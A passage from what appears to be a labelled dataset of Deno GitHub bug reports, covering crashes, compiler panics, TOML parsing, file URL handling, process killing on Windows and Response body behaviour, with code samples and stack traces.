0x7ff7af53cecc - <unknown>\r\n   2:     0x7ff7af889483 - <unknown>\r\n   3:     0x7ff7af888bb8 - <unknown>\r\n   4:     0x7ff7af887d2e - <unknown>\r\n   5:     0x7ff7af88efe5 - <unknown>\r\n   6:     0x7ff7af53a4b0 - <unknown>\r\n   7:     0x7ff7af53a2cc - <unknown>\r\n   8:     0x7ff7af36cbf2 - <unknown>\r\n   9:     0x7ff7af48ada8 - <unknown>\r\n  10:     0x7ff7af48b345 - <unknown>\r\n  11:     0x7ff7af53cecc - <unknown>\r\n  12:     0x7ff7af751885 - <unknown>\r\n  13:     0x7ff7af349c1d - <unknown>\r\n  14:     0x7ff7af4daf6f - <unknown>\r\n  15:     0x7ff7af8aa3f6 - <unknown>\r\n  16:     0x7ff7af4ea67e - <unknown>\r\n  17:     0x7ff7b048bf10 - CrashForExceptionInNonABICompliantCodeRange\r\n  18:     0x7ff8e9777bd4 - BaseThreadInitThunk\r\n  19:     0x7ff8ea16ce51 - RtlUserThreadStart\r\n```\r\n\r\nI don't know how to reproduce the bug but it happened in my project so I tried to isolate it in a separated branch:\r\nhttps://github.com/AndreJesusBrito/WebAssembly-Language-Compiler/tree/rust-exception-bug-isolation\r\n\r\nThe bug happens in file `src/SyntaxAnalysis/SyntaxRule.ts` at line 25 when I throw an exception.\r\n```ts\r\n...\r\npublic getDerivation(terminal: string): RuleDerivation {\r\n  const derivation = this.derivations.get(terminal);\r\n  if (derivation) {\r\n    return {\r\n      derivationSymbols: [...derivation.derivationSymbols].reverse(),\r\n      actions: derivation.actions,\r\n    };\r\n  } else {\r\n    throw SyntaxError(\"Unexpected token '\" + terminal + \"' at rule \" + this._name);            // THIS IS LINE 25\r\n  }\r\n}\r\n\r\npublic setDerivation(rule: SyntaxSymbol[], actions: ActionObj[], ...terminals: string[]): void {\r\n  for (const terminal of terminals) {\r\n    if (this.derivations.get(terminal) instanceof Array) {\r\n      console.warn(\"'\" + terminal + \"' repeated terminal for rule \" + this._name);\r\n...\r\n```\r\n\r\nEven though I'm using a SyntaxError (that is not a very good idea and will change later) it seems to happen for any error including the base Error class.\r\n\r\nThe most strange thing to me is that by changing the white space on this file it can work correctly.\r\nFor example, when I remove line 28 it works fine:\r\n```\r\nerror: Uncaught SyntaxError: Unexpected token '' at rule none\r\n  public setDerivation(rule: SyntaxSymbol[], actions: ActionObj[], ...terminals: string[]): void {\r\n            ^\r\n    at SyntaxRule.getDerivation (file:///C:/Users/Andr%C3%A9%20Brito/Documents/GitHub/WebAssembly-Language-Compiler/src/SyntaxAnalysis/SyntaxRule.ts:28:13)\r\n    at file:///C:/Users/Andr%C3%A9%20Brito/Documents/GitHub/WebAssembly-Language-Compiler/src/main.ts:4:1\r\n```\r\n\r\nI'm running using the command:\r\n```\r\ndeno run src\\main.ts\r\n```\r\n\r\nand my specs are:\r\n```\r\ndeno 1.2.2\r\nv8 8.5.216\r\ntypescript 3.9.2\r\nOS: Windows_NT x64 10.0.18362\r\n```\r\n\r\nHope this helps! :)\r\n"},{"labels":["bug",null,null],"text":"In the windows system (Windows 10 19041.388 OS build), process or worker is not killed when the env has been set.\r\n\r\nThis creates a new worker every single time when detecting the file changes without terminating.\r\n\r\nexample code\r\n`watcher.ts`\r\n```ts\r\nlet worker: any = null;\r\n\r\nfunction runWorker() {\r\n  worker = Deno.run({\r\n    env: {\r\n      \"DEVELOPMENT\": \"true\"\r\n    },\r\n    cmd: [\r\n      \"deno\",\r\n      \"run\",\r\n      \"-A\",\r\n      \"--unstable\",\r\n      \"./test.ts\"\r\n    ]\r\n  });\r\n}\r\n\r\nconst startWatcher = async (path: string) => {\r\n  const watcher = Deno.watchFs(path);\r\n  for await (const event of watcher) {\r\n    console.log(\"\\nRestarting due to the file has been changed. :)\")\r\n    if (worker) {\r\n      if (Deno.build.os === \"windows\") {\r\n        // not closed\r\n        worker.close()\r\n      }\r\n      else {\r\n        // not closed\r\n        worker.kill(Deno.Signal.SIGKILL)\r\n      }\r\n\r\n      runWorker();\r\n    }\r\n  }\r\n}\r\n\r\nrunWorker()\r\nconst watchers = [\"./folder\", \"./secondFolder\"].map(async (p) => await startWatcher(p))\r\nawait Promise.all(watchers);\r\n```\r\n\r\n`test.ts`\r\n```ts\r\nself.onunload = (ev: any) => {\r\n  console.log(ev)\r\n}\r\n\r\nconsole.log(\"started\");\r\n\r\nwhile(true) {\r\n\r\n}\r\n```\r\n\r\n```\r\ndeno run -A --unstable watcher.ts\r\n```\r\n\r\nthis is a process example, and workers would not be killed as well."},{"labels":["bug",null],"text":"In the repl if I print this\r\n\r\n```\r\n> new Float64Array([2.1, 2.01,  2.001, 2.0001,  2.00001, 2.000001,  2.0000001, 2.00000001,  2.000000001, 2.0000000001, 2])\r\nFloat64Array(11) [\r\n  2.1,         2.01,\r\n  2.001,       2.0001,\r\n  2.00001,     2.000001,\r\n  2.0000001,   2.00000001,\r\n  2.000000001, 2.0000000001,\r\n            2\r\n]\r\n```\r\nThe last `2` is out of alignment.\r\n\r\n\r\nDeno version 1.2.2"},{"labels":["bug",null],"text":"```\r\n➜ deno --version\r\ndeno 1.2.2\r\nv8 8.5.216\r\ntypescript 3.9.2\r\n```\r\n\r\nRunning `deno info --no-check cli.ts` on https://github.com/halvardssm/deno-nessie throws the following error:\r\n\r\n```\r\nerror: Uncaught SyntaxError: Unexpected token '['\r\n  public available_actions: Array<Command> = [];\r\n^\r\n    at <https://deno.land/x/denomander@0.6.2/src/Kernel.ts>:35:1\r\n```"},{"labels":["bug",null],"text":"I could not find an exact example of this in the TOML spec, but since comments are valid after other types of key-value pairs, I expected the same for booleans. \r\n\r\nThe stdlib's TOML parser fails to parse ```Example B``` in the following example:\r\n```ts\r\nimport { parse } from \"https://deno.land/std/encoding/toml.ts\";\r\n\r\n// Example A: This parses correctly\r\nconsole.log(parse(`\r\ndoes_this_work = true\r\n`));\r\n\r\n// Example B: TOML parser throws a SyntaxError\r\nconsole.log(parse(`\r\ndoes_this_also_work = false # im a comment\r\n`));\r\n```\r\n\r\nError thrown:\r\n```\r\n$ deno run issue.ts\r\n{ does_this_work: true }\r\nerror: Uncaught SyntaxError: Invalid or unexpected token\r\n    at Parser._parseData (toml.ts:260:17)\r\n    at Parser._processDeclaration (toml.ts:192:24)\r\n    at Parser._parseLines (toml.ts:367:25)\r\n    at Parser.parse (toml.ts:416:10)\r\n    at parse (toml.ts:596:33)\r\n    at issue.ts:7:13\r\n```\r\n```Example A``` parses correctly, yet, ```Example B``` throws an error. \r\n\r\n**Deno Version:** 1.2.2"},{"labels":["bug"],"text":"Hi, thanks for working on a previous issue #6747. I found another case that you may want to have a look at.\r\n\r\nAgain, I know the code being submitted to the compiler is invalid; however, I want Deno to tell me that instead of panicing.\r\n\r\nThanks!\r\n\r\nDeno version:\r\n```\r\ndeno 1.2.1\r\nv8 8.5.216\r\ntypescript 3.9.2\r\n```\r\n\r\nExample code:\r\n```\r\nDeno.compile(\"main.js\", { \"main.js\": `\r\nexport class Foo {\r\n  constructor() {\r\n    console.log(\"foo\");\r\n  }\r\n  export get() {\r\n    console.log(\"bar\");\r\n  }\r\n}\r\n`});\r\n```\r\n\r\nAttempted compile with:\r\n\r\n`$ deno run --unstable foo.js`\r\n    \r\n`thread 'main' panicked at 'Can't downcast ErrBox(SwcDiagnosticBuffer { diagnostics: [\"Unexpected token Some(Word(get)) at memory://main.js:6:9\"] }) to OpError', cli/op_error.rs:423:9\r\n`\r\n\r\nAlso, if you have a recommendation for a third party module that might be able to pre-parse code to filter out cases like these I'd be happy to hear about it."},{"labels":["bug",null],"text":"Possibly related: #6351, #6408\r\n\r\nI have prepared a test to demonstrate the issue.\r\n\r\nEssentially, the result of `path.fromFileUrl` must be decoded by `decodeURI` in order to be correctly handled by `Deno.readTextFile`. It also appears that providing a URL object fails in this test.\r\n\r\nSee code for details:\r\n\r\n<details>\r\n<summary><code>test.ts</code></summary>\r\n\r\n```ts\r\n// deno test --allow-env --allow-read --allow-write test.ts\r\n\r\nimport * as path from 'https://deno.land/std@0.62.0/path/mod.ts';\r\nimport {assertEquals} from 'https://deno.land/std@0.62.0/testing/asserts.ts';\r\nimport {ensureDir} from 'https://deno.land/std@0.62.0/fs/ensure_dir.ts';\r\n\r\nconst dirname = '___Deno URL Path Test';\r\nconst filename = 'hello.txt';\r\nconst fileContent = 'hello world';\r\n\r\nconst getRequiredEnvVar = (varName: string): string => {\r\n  const value = Deno.env.get(varName);\r\n  if (!value?.length) throw new Error(`$env:${varName} not set`);\r\n  return value;\r\n};\r\n\r\nconst writeTestData = async (testDir: string): Promise<string> => {\r\n  await ensureDir(testDir);\r\n  await Deno.writeTextFile(path.join(testDir, filename), fileContent);\r\n  return testDir;\r\n};\r\n\r\nconst deleteTestData = async (testDir: string): Promise<void> => {\r\n  await Deno.remove(testDir, {recursive: true});\r\n};\r\n\r\nif (Deno.build.os === 'windows') {\r\n  const username = getRequiredEnvVar('USERNAME');\r\n  const rawUrl = `/Users/${username}/${dirname}/${filename}`;\r\n  const fileUrl = new URL(`file://${rawUrl}`);\r\n\r\n  const fromFileUrl = path.fromFileUrl(fileUrl);\r\n  const resolvedPath = path.resolve(fromFileUrl);\r\n\r\n  const decodedPath = decodeURI(fromFileUrl);\r\n  const resolvedDecodedPath = path.resolve(decodedPath);\r\n\r\n  const paths = {\r\n    fileUrl,\r\n    fromFileUrl,\r\n    resolvedPath,\r\n    decodedPath,\r\n    resolvedDecodedPath,\r\n  };\r\n\r\n  const userprofile = getRequiredEnvVar('USERPROFILE');\r\n  const testDir = path.join(userprofile, dirname);\r\n\r\n  for (const [name, path] of Object.entries(paths)) {\r\n    Deno.test({\r\n      name: `${name}: ${path}`,\r\n      fn: async (): Promise<void> => {\r\n        await writeTestData(testDir);\r\n        try {\r\n          const content = await Deno.readTextFile(path);\r\n          assertEquals(content, fileContent);\r\n        }\r\n        finally {\r\n          await deleteTestData(testDir);\r\n        }\r\n      },\r\n    });\r\n  }\r\n}\r\n```\r\n</details>\r\n\r\nOutput:\r\n\r\n```\r\n> deno test --allow-env --allow-read --allow-write test.ts\r\nrunning 5 tests\r\ntest fileUrl: \"file:///Users/Jesse/___Deno%20URL%20Path%20Test/hello.txt\" ... FAILED (6ms)\r\ntest fromFileUrl: \"\\Users\\Jesse\\___Deno%20URL%20Path%20Test\\hello.txt\" ... FAILED (3ms)\r\ntest resolvedPath: \"C:\\Users\\Jesse\\___Deno%20URL%20Path%20Test\\hello.txt\" ... FAILED (3ms)\r\ntest decodedPath: \"\\Users\\Jesse\\___Deno URL Path Test\\hello.txt\" ... ok (5ms)\r\ntest resolvedDecodedPath: \"C:\\Users\\Jesse\\___Deno URL Path Test\\hello.txt\" ... ok (3ms)\r\n\r\nfailures:\r\n\r\nfileUrl: \"file:///Users/Jesse/___Deno%20URL%20Path%20Test/hello.txt\"\r\nTypeError: A URL with the file schema must be absolute.\r\n    at pathFromURLWin32 (rt\\06_util.js:79:13)\r\n    at pathFromURL (rt\\06_util.js:101:11)\r\n    at opOpen (rt\\30_files.js:35:41)\r\n    at open (rt\\30_files.js:52:23)\r\n    at Object.readTextFile (rt\\40_read_file.js:30:24)\r\n    at fn (test.ts:56:38)\r\n    at async asyncOpSanitizer (rt\\40_testing.js:34:7)\r\n    at async Object.resourceSanitizer [as fn] (rt\\40_testing.js:68:7)\r\n    at async TestRunner.[Symbol.asyncIterator] (rt\\40_testing.js:240:13)\r\n    at async Object.runTests (rt\\40_testing.js:317:22)\r\n\r\nfromFileUrl: \"\\Users\\Jesse\\___Deno%20URL%20Path%20Test\\hello.txt\"\r\nNotFound: The system cannot find the path specified. (os error 3)\r\n    at unwrapResponse (rt\\10_dispatch_json.js:25:13)\r\n    at sendAsync (rt\\10_dispatch_json.js:76:12)\r\n    at async open (rt\\30_files.js:52:17)\r\n    at async Object.readTextFile (rt\\40_read_file.js:30:18)\r\n    at async fn (test.ts:56:27)\r\n    at async asyncOpSanitizer (rt\\40_testing.js:34:7)\r\n    at async Object.resourceSanitizer [as fn] (rt\\40_testing.js:68:7)\r\n    at async TestRunner.[Symbol.asyncIterator] (rt\\40_testing.js:240:13)\r\n    at async Object.runTests (rt\\40_testing.js:317:22)\r\n\r\nresolvedPath: \"C:\\Users\\Jesse\\___Deno%20URL%20Path%20Test\\hello.txt\"\r\nNotFound: The system cannot find the path specified. (os error 3)\r\n    at unwrapResponse (rt\\10_dispatch_json.js:25:13)\r\n    at sendAsync (rt\\10_dispatch_json.js:76:12)\r\n    at async open (rt\\30_files.js:52:17)\r\n    at async Object.readTextFile (rt\\40_read_file.js:30:18)\r\n    at async fn (test.ts:56:27)\r\n    at async asyncOpSanitizer (rt\\40_testing.js:34:7)\r\n    at async Object.resourceSanitizer [as fn] (rt\\40_testing.js:68:7)\r\n    at async TestRunner.[Symbol.asyncIterator] (rt\\40_testing.js:240:13)\r\n    at async Object.runTests (rt\\40_testing.js:317:22)\r\n\r\nfailures:\r\n\r\n        fileUrl: \"file:///Users/Jesse/___Deno%20URL%20Path%20Test/hello.txt\"\r\n        fromFileUrl: \"\\Users\\Jesse\\___Deno%20URL%20Path%20Test\\hello.txt\"\r\n        resolvedPath: \"C:\\Users\\Jesse\\___Deno%20URL%20Path%20Test\\hello.txt\"\r\n\r\ntest result: FAILED. 2 passed; 3 failed; 0 ignored; 0 measured; 0 filtered out (22ms)\r\n```"},{"labels":["bug",null],"text":"```\r\n\r\nconst originEnv =String.raw`ALLUSERSPROFILE=C:\\ProgramData\r\nAPPDATA=C:\\Users\\lygstate\\AppData\\Roaming\r\nATOS_XEMU_LICENSE_PATH=C:\\Program Files\\XEMU-Player\\xemu-config\\xemu.lic\r\nCHROME_CRASHPAD_PIPE_NAME=\\\\.\\pipe\\crashpad_11252_LERYGIRDJLUMNVNV\r\nCHROME_RESTART=Google Chrome|Whoa! Google Chrome has crashed. Relaunch now?|LEFT_TO_RIGHT\r\nCommonProgramFiles=C:\\Program Files\\Common Files\r\nCommonProgramFiles(x86)=C:\\Program Files (x86)\\Common Files\r\nCommonProgramW6432=C:\\Program Files\\Common Files\r\nCOMPUTERNAME=DESKTOP-94PU0GB\r\nComSpec=C:\\WINDOWS\\system32\\cmd.exe\r\nDriverData=C:\\Windows\\System32\\Drivers\\DriverData\r\nFPS_BROWSER_APP_PROFILE_STRING=Internet Explorer\r\nFPS_BROWSER_USER_PROFILE_STRING=Default\r\nGOPATH=C:\\Users\\lygstate\\go\r\nHOMEDRIVE=C:\r\nHOMEPATH=\\Users\\lygstate\r\nJAVA_HOME=C:\\Program Files\\RedHat\\java-11-openjdk-11.0.7-1\\\r\nLM_LICENSE_FILE=C:\\Tornado2.2\\license.dat\r\nLOCALAPPDATA=C:\\Users\\lygstate\\AppData\\Local\r\nLOGONSERVER=\\\\DESKTOP-94PU0GB\r\nMOSQUITTO_DIR=C:\\Program Files\\mosquitto\r\nNUMBER_OF_PROCESSORS=8\r\nOneDrive=C:\\Users\\lygstate\\OneDrive\r\nOS=Windows_NT\r\nPath=C:\\Program Files (x86)\\Google\\Chrome\\Application;C:\\Program Files (x86)\\Common Files\\Oracle\\Java\\javapath;C:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\Scripts\\;C:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\;C:\\WINDOWS\\system32;C:\\WINDOWS;C:\\WINDOWS\\System32\\Wbem;C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\;C:\\WINDOWS\\System32\\OpenSSH\\;C:\\Program Files (x86)\\Bitvise SSH Client;C:\\Program Files\\Microsoft SQL Server\\130\\Tools\\Binn\\;C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\170\\Tools\\Binn\\;C:\\Program Files\\Microsoft VS Code\\bin;C:\\Program Files\\Microsoft Windows Performance Toolkit\\;C:\\Program Files (x86)\\Microsoft Visual Studio 10.0\\Common7\\IDE;C:\\Program Files\\CMake\\bin;C:\\Program Files (x86)\\Windows Kits\\10\\Windows Performance Toolkit\\;C:\\Program Files (x86)\\Windows Kits\\8.1\\Windows Performance Toolkit\\;C:\\Go\\bin;C:\\Program Files\\PowerShell\\7\\;C:\\Program Files\\Liquid Technologies\\Liquid Studio 2020\\XmlDataBinder18\\Redist18\\cpp\\win32\\bin;C:\\Program Files\\Liquid Technologies\\Liquid Studio 2020\\XmlDataBinder18\\Redist18\\cpp\\win64\\bin;C:\\Program Files\\RedHat\\java-11-openjdk-11.0.6-2\\bin;C:\\Program Files\\RedHat\\java-11-openjdk-jre-11.0.7-1\\bin;C:\\Program Files\\RedHat\\java-11-openjdk-11.0.7-1\\missioncontrol\\;C:\\Program Files\\RedHat\\java-11-openjdk-11.0.7-1\\bin;C:\\Program Files\\7-Zip;C:\\Program Files (x86)\\STMicroelectronics\\STM32 ST-LINK Utility\\ST-LINK Utility;C:\\Program Files\\dotnet\\;C:\\Program Files\\RedHat\\java-11-openjdk-11.0.7-1\\bin;C:\\CI-Tools\\apache-maven-3.6.3\\bin;C:\\Program Files\\nodejs\\;C:\\Program Files (x86)\\Gpg4win\\..\\GnuPG\\bin;C:\\Program Files\\TortoiseGit\\bin;C:\\Program Files\\Git\\cmd;C:\\Windows\\System32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Users\\lygstate\\.dotnet\\tools;C:\\Users\\lygstate\\AppData\\Roaming\\npm;C:\\Users\\lygstate\\bin;;C:\\Users\\lygstate\\.deno\\bin\r\nPATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC\r\nPOWERSHELL_DISTRIBUTION_CHANNEL=MSI:Windows 10 Pro for Workstations\r\nPROCESSOR_ARCHITECTURE=AMD64\r\nPROCESSOR_IDENTIFIER=Intel64 Family 6 Model 142 Stepping 11, GenuineIntel\r\nPROCESSOR_LEVEL=6\r\nPROCESSOR_REVISION=8e0b\r\nProgramData=C:\\ProgramData\r\nProgramFiles=C:\\Program Files\r\nProgramFiles(x86)=C:\\Program Files (x86)\r\nProgramW6432=C:\\Program Files\r\nPROMPT=$P$G\r\nPSModulePath=C:\\Program Files\\WindowsPowerShell\\Modules;C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\Modules\r\nPUBLIC=C:\\Users\\Public\r\nQtMsBuild=C:\\Users\\lygstate\\AppData\\Local\\QtMsBuild\r\nREDHAT_JAVA_HOME=C:\\Program Files\\RedHat\\java-11-openjdk-11.0.7-1\\\r\nSESSIONNAME=Console\r\nSystemDrive=C:\r\nSystemRoot=C:\\WINDOWS\r\nTEMP=C:\\Users\\lygstate\\AppData\\Local\\Temp\r\nTMP=C:\\Users\\lygstate\\AppData\\Local\\Temp\r\nUSERDOMAIN=DESKTOP-94PU0GB\r\nUSERDOMAIN_ROAMINGPROFILE=DESKTOP-94PU0GB\r\nUSERNAME=lygstate\r\nUSERPROFILE=C:\\Users\\lygstate\r\nVISUALGDB_DIR=C:\\Program Files (x86)\\Sysprogs\\VisualGDB\\\r\nVS100COMNTOOLS=c:\\Program Files (x86)\\Microsoft Visual Studio 10.0\\Common7\\Tools\\\r\nVS140COMNTOOLS=C:\\Program Files (x86)\\Microsoft Visual Studio 14.0\\Common7\\Tools\\\r\nVS90COMNTOOLS=C:\\CI-Tools\\vs\\Microsoft Visual Studio 9.0\\Common7\\Tools\\\r\nwindir=C:\\WINDOWS`\r\n\r\nconsole.log(originEnv)\r\n\r\n```"},{"labels":["bug",null,null],"text":"Came across this when using the https://github.com/jakobhellermann/deno-progressbar library to provide feedback on a series of tasks.\r\n\r\n**example script that has the issue**\r\n\r\n```ts\r\nconst exampleSource = [\"one\", \"two\"];\r\nconst encoder = new TextEncoder();\r\n\r\nconst exampleProcesses = exampleSource.map(async (value) => {\r\n  const text = `${value}`;\r\n  await Deno.stdout.write(encoder.encode(text));\r\n});\r\n\r\nawait Promise.all([\r\n  ...exampleProcesses,\r\n  // not needed to reproduce, this is just to show the promise unresolved status in output\r\n  new Promise((_, reject) => {\r\n    setTimeout(() => {\r\n      console.log(\"\\n---\\nfailures\");\r\n      exampleProcesses.forEach(console.log);\r\n      reject();\r\n    }, 1000);\r\n  }),\r\n]);\r\nconsole.log(\"never reached\");\r\n```\r\n**output of example script**\r\n\r\n```sh\r\ndeno run test.ts\r\nCheck file:///Users/lukewoollard/work/deno-figma/test.ts\r\nonetwo\r\n---\r\nfailures\r\nPromise { <pending> } 0 [ Promise { <pending> }, Promise { undefined } ]\r\nPromise { undefined } 1 [ Promise { <pending> }, Promise { undefined } ]\r\nerror: Uncaught undefined\r\n```\r\n\r\nWorked around this locally by vendoring that code and replacing the use of `await Deno.stdout.write` with `Deno.stdout.writeSync`.\r\n\r\n**Related issue**: https://github.com/denoland/deno/issues/5515"},{"labels":["bug",null],"text":"The command `deno --quiet -- run <my_script>` produces the following error:\r\n\r\n```\r\nerror: The subcommand 'run' wasn't recognized\r\n        Did you mean 'run'?\r\n\r\nIf you believe you received this message in error, try re-running with 'deno -- run'\r\n\r\nUSAGE:\r\n    deno --quiet\r\n\r\nFor more information try --help\r\n```\r\n\r\nVersion information:\r\n\r\ndeno 1.2.0\r\nv8 8.5.216\r\ntypescript 3.9.2"},{"labels":["bug"],"text":"I've noticed that my server will run normally for some time (varies, but I'd expect sometimes for a few hours), then at an arbitrary point it will just stop responding, even if I haven't touched it for a while. Whenever this issue arises, I get the following from netstat -tulpn\r\n\r\n```\r\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\r\ntcp        2      0 0.0.0.0:443             0.0.0.0:*               LISTEN      127338/deno\r\n```\r\n\r\nIt looks completely normal, except the Recv-Q, which indicates that some of the requests haven't been processed. They will hang there forever, and just increment as I make additional calls.\r\n\r\nI've dumped the logs and found an error that traces back to dispatch_json.ts from the serveTLS method.\r\n\r\n```\r\nerror: Uncaught AddrInUse: Address already in use (os error 98)\r\n    at unwrapResponse ($deno$/ops/dispatch_json.ts:42:1>\r\n    at Object.sendSync ($deno$/ops/dispatch_json.ts:69:>\r\n    at Object.listenTls ($deno$/ops/tls.ts:67:10^>\r\n    at Object.listenTls ($deno$/tls.ts:51:22^[[90>\r\n    at serveTLS (server.ts:339:25)\r\n    at server.ts:32:11\r\n```\r\n\r\nWorth noting that it doesn't actually stop the server from running, it's just that the server will no longer fulfill any requests. My Postman will just sit there forever with \"Sending Request...\" until I cancel it.\r\n\r\nNot sure what else to post, but I'm happy to answer any additional questions that I can."},{"labels":["bug",null],"text":"It looks like `res.body` isn't defined when creating a Response from an ArrayBuffer.\r\n\r\nAt first glance, at least, it looks like there are some cases missing in the [Body implementation](https://github.com/denoland/deno/blob/master/cli/js/web/body.ts#L95-L113).\r\n\r\n```typescript\r\nimport {\r\n  assert,\r\n  assertEquals,\r\n} from \"https://deno.land/std/testing/asserts.ts\";\r\n\r\n// this passes\r\nDeno.test(\"should be able to get text and body from a text response\", async () => {\r\n  const res = new Response('hi')\r\n  assert(res.body)\r\n  assertEquals(await res.text(), 'hi')\r\n})\r\n\r\n// body isn't defined\r\nDeno.test(\"should be able to get text and body from a byte array response\", async () => {\r\n  const bytes = new TextEncoder().encode('hi')\r\n  assert(bytes.buffer instanceof ArrayBuffer)\r\n  const res = new Response(bytes.buffer)\r\n  assert(res.body, \"body should exist\")\r\n  assertEquals(await res.text(), 'hi')\r\n})\r\n```\r\n\r\nTested with:\r\n```\r\ndeno 1.2.0\r\nv8 8.5.216\r\ntypescript 3.9.2\r\n```"},{"labels":["bug",null],"text":"@bartlomieju  the following code:\r\n```\r\n// @deno-types=\"https://deno.land/x/types/react-dom/v16.13.1/react-dom.d.ts\"\r\nimport ReactDOMServer from \"https://cdn.pika.dev/react-dom@16.13.1/server.js\";\r\n\r\n// @deno-types=\"https://deno.land/x/types/react/v16.13.1/react.d.ts\"\r\nimport React from \"https://cdn.pika.dev/react@16.13.1\";\r\nReactDOMServer.renderToString(<div/>)\r\n```\r\n\r\nThrows: error: TS2339 [ERROR]: Property 'renderToString' does not exist on type 'typeof import(\"https://cdn.pika.dev/-/react-dom@v16.13.1-qv1YB4ZAVXJG84jEgino/dist=es2019,mode=types/index%22)'.\r\nBut:\r\n\r\n```\r\n// @deno-types=\"https://deno.land/x/types/react/v16.13.1/react.d.ts\"\r\nimport React from \"https://dev.jspm.io/react@16.13.1\";\r\n\r\n// @deno-types=\"https://deno.land/x/types/react-dom/v16.13.1/server.d.ts\"\r\nimport ReactDOMServer from \"https://dev.jspm.io/react-dom@16.13.1/server\";\r\n\r\nReactDOMServer.renderToString(<div/>)\r\n```\r\nWorks just fine Thanks for your help"},{"labels":["bug",null],"text":"Hi,\r\n\r\nI'm running this version:\r\n\r\n```\r\n$ deno --version\r\ndeno 1.1.3\r\nv8 8.5.216\r\ntypescript 3.9.2\r\n```\r\n\r\nExample code:\r\n```\r\nDeno.compile(\"main.js\", {\"main.js\": \"console.log(foo);\"});\r\n```\r\n\r\nWhen I compile, I **expect** to get an exception or an error (yes, the code is obviously incorrect). I expect the Deno program to continue running after evaluating the expression. Instead, the Deno program panics and exits. If this is the same as https://github.com/denoland/deno/issues/6423 then please advise.\r\n\r\n`\r\n$ deno run --unstable foo.js                                              \r\nthread 'main' panicked at 'Can't downcast ErrBox(JSError(JSError { message: \"Uncaught AssertionError: Unexpected skip of the emit.\", source_line: None, script_resource_name: Some(\"$deno$/util.ts\"), line_number: Some(35), start_column: Some(10), end_column: Some(11), frames: [JSStackFrame { type_name: Some(\"Object\"), function_name: Some(\"assert\"), method_name: Some(\"assert\"), file_name: Some(\"$deno$/util.ts\"), line_number: Some(35), column_number: Some(11), eval_origin: None, is_top_level: None, is_eval: false, is_native: false, is_constructor: false, is_async: false, is_promise_all: false, promise_index: Some(11) }, JSStackFrame { type_name: None, function_name: Some(\"runtimeCompile\"), method_name: None, file_name: Some(\"$deno$/compiler.ts\"), line_number: Some(1534), column_number: Some(3), eval_origin: None, is_top_level: None, is_eval: false, is_native: false, is_constructor: false, is_async: false, is_promise_all: false, promise_index: Some(3) }, JSStackFrame { type_name: Some(\"global\"), function_name: Some(\"tsCompilerOnMessage\"), method_name: Some(\"onmessage\"), file_name: Some(\"$deno$/compiler.ts\"), line_number: Some(1666), column_number: Some(22), eval_origin: None, is_top_level: None, is_eval: false, is_native: false, is_constructor: false, is_async: false, is_promise_all: false, promise_index: Some(22) }, JSStackFrame { type_name: None, function_name: Some(\"workerMessageRecvCallback\"), method_name: None, file_name: Some(\"$deno$/runtime_worker.ts\"), line_number: Some(72), column_number: Some(33), eval_origin: None, is_top_level: None, is_eval: false, is_native: false, is_constructor: false, is_async: false, is_promise_all: false, promise_index: Some(33) }, JSStackFrame { type_name: Some(\"global\"), function_name: None, method_name: None, file_name: Some(\"file:///Users/schoward63/dev/k/tmpl1/src/__anonymous__\"), line_number: Some(1), column_number: Some(1), eval_origin: None, is_top_level: None, is_eval: false, is_native: false, is_constructor: false, is_async: false, is_promise_all: false, promise_index: Some(1) }], formatted_frames: [\"Object.assert ($deno$/util.ts:35:11)\", \"runtimeCompile ($deno$/compiler.ts:1534:3)\", \"tsCompilerOnMessage ($deno$/compiler.ts:1666:22)\", \"workerMessageRecvCallback ($deno$/runtime_worker.ts:72:33)\", \"file:///Users/schoward63/dev/k/tmpl1/src/__anonymous__:1:1\"] })) to OpError', cli/op_error.rs:422:9\r\n`\r\n"},{"labels":["bug",null],"text":"https://github.com/denoland/deno/pull/6729/checks?check_run_id=864887110\r\n\r\n```\r\n2020-07-13T11:52:15.3420551Z bufferGrowReadCloseToMaxBuffer\r\n2020-07-13T11:52:15.3420757Z RangeError: Array buffer allocation failed\r\n2020-07-13T11:52:15.3420962Z     at new ArrayBuffer (<anonymous>)\r\n2020-07-13T11:52:15.3428091Z     at new Uint8Array (<anonymous>)\r\n2020-07-13T11:52:15.3428312Z     at Buffer.#grow ($deno$/buffer.ts:141:19)\r\n2020-07-13T11:52:15.3428677Z     at Buffer.writeSync ($deno$/buffer.ts:110:25)\r\n2020-07-13T11:52:15.3428895Z     at Buffer.readFrom ($deno$/buffer.ts:176:28)\r\n2020-07-13T11:52:15.3429171Z     at async bufferGrowReadCloseToMaxBuffer (file:///home/runner/work/deno/deno/cli/tests/unit/buffer_test.ts:252:7)\r\n2020-07-13T11:52:15.3433703Z     at async asyncOpSanitizer ($deno$/testing.ts:34:5)\r\n2020-07-13T11:52:15.3439068Z     at async Object.resourceSanitizer [as fn] ($deno$/testing.ts:68:5)\r\n2020-07-13T11:52:15.3439333Z     at async TestRunner.[Symbol.asyncIterator] ($deno$/testing.ts:276:11)\r\n2020-07-13T11:52:15.3439564Z     at async runTests ($deno$/testing.ts:364:20)\r\n2020-07-13T11:52:15.3439710Z \r\n2020-07-13T11:52:15.3442568Z bufferReadCloseToMaxBufferWithInitialGrow\r\n2020-07-13T11:52:15.3442899Z Unit tests failed\r\n2020-07-13T11:52:15.3443119Z RangeError: Array buffer allocation failed\r\n2020-07-13T11:52:15.3443345Z     at new ArrayBuffer (<anonymous>)\r\n2020-07-13T11:52:15.3445762Z     at new Uint8Array (<anonymous>)\r\n2020-07-13T11:52:15.3446000Z     at Buffer.#grow ($deno$/buffer.ts:141:19)\r\n2020-07-13T11:52:15.3478588Z     at Buffer.grow ($deno$/buffer.ts:155:25)\r\n2020-07-13T11:52:15.3486037Z     at bufferReadCloseToMaxBufferWithInitialGrow (file:///home/runner/work/deno/deno/cli/tests/unit/buffer_test.ts:265:11)\r\n2020-07-13T11:52:15.3486568Z     at asyncOpSanitizer ($deno$/testing.ts:34:11)\r\n2020-07-13T11:52:15.3486819Z     at Object.resourceSanitizer [as fn] 